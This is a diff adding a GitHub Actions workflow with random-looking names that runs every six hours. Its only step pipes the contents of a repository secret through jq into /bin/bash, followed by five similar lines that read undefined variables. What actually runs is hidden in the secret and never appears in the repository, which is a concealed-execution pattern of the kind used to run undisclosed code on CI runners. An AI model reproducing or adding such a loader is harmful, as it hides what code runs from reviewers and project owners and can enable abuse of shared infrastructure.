@@ -1,0 +1,23 @@
+name: fengshanqiuyou
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '29 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: fengshanqiuyou
+        env:
+          dfr54: ${{ secrets.dfr54 }}
+        run: |
+          echo $dfr54 | jq -r .stbgc339 | /bin/bash
+          echo $iqaw094 | jq -r .uwbuh4774 | /bin/bash
+          echo $s4 | jq -r .m33 | /bin/bash
+          echo $wqsqv6735 | jq -r .amv92 | /bin/bash
+          echo $gouwy043 | jq -r .b020 | /bin/bash
+          echo $cs24907 | jq -r .ozf00 | /bin/bash
+
